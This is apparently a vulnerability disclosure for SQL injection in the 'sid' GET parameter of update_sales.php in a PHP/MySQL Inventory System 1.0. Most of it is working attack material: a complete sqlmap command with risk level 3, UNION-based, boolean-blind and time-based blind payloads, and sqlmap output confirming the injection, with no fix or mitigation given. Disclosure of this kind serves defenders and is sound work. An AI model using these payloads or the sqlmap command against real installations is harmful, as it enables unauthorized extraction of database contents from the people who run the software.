# SQL Injection in Inventory System (Update Sales)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Update Sales (`update_sales.php`)
* **Vulnerable Parameter**: `sid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `update_sales.php` file.

The application fails to properly sanitize the `sid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries** (25 columns), attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP request to `update_sales.php` injecting SQL into the `sid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/update_sales.php?sid=49&table=stock_sales&return=view_sales.php" \
--data "id=49&stockid=SD425&date=2014-05-15+&bill_no=PR428&supplier=Regular+&address=Bahawakchowk&contact=0345355282&stock_name%5B%5D=111&quantity%5B%5D=3.00&s_id%5B%5D=49&sell%5B%5D=57.00&stock%5B%5D=0&total%5B%5D=171.00&gu_id%5B%5D=49&stock_name%5B%5D=salienty&quantity%5B%5D=3.00&s_id%5B%5D=50&sell%5B%5D=5.00&stock%5B%5D=360&total%5B%5D=15.00&gu_id%5B%5D=50&stock_name%5B%5D=shugar&quantity%5B%5D=3.00&s_id%5B%5D=51&sell%5B%5D=100.00&stock%5B%5D=386&total%5B%5D=300.00&gu_id%5B%5D=51&discount=0&dis_amount=0&subtotal=486&description=&payment=486.00&balance=0.00&payable=486.00&mode=cheque&due=22-01-2026&tax=0&tax_dis=&Submit=Add" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sid=-2611' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6271,0x566879796a776d50487a51664267515552414549555566764f434444674a6c46746d6e4d56767758,0x7176627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&table=stock_sales&return=view_sales.php

```

**Boolean-based Blind Payload:**

```sql
sid=49' AND 4407=4407 AND 'GSmv'='GSmv&table=stock_sales&return=view_sales.php

```

**Time-based Blind Payload:**

```sql
sid=49' AND (SELECT 1501 FROM (SELECT(SLEEP(5)))JwLn) AND 'yzhk'='yzhk&table=stock_sales&return=view_sales.php

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: sid=49' AND 4407=4407 AND 'GSmv'='GSmv&table=stock_sales&return=view_sales.php
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sid=49' AND (SELECT 1501 FROM (SELECT(SLEEP(5)))JwLn) AND 'yzhk'='yzhk&table=stock_sales&return=view_sales.php
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 25 columns
    Payload: sid=-2611' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6271,0x566879796a776d50487a51664267515552414549555566764f434444674a6c46746d6e4d56767758,0x7176627a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&table=stock_sales&return=view_sales.php
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12

```
<img width="1062" height="405" alt="图片" src="https://github.com/user-attachments/assets/b8661128-5ac7-4ca0-8a3c-ed2b8c278260" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
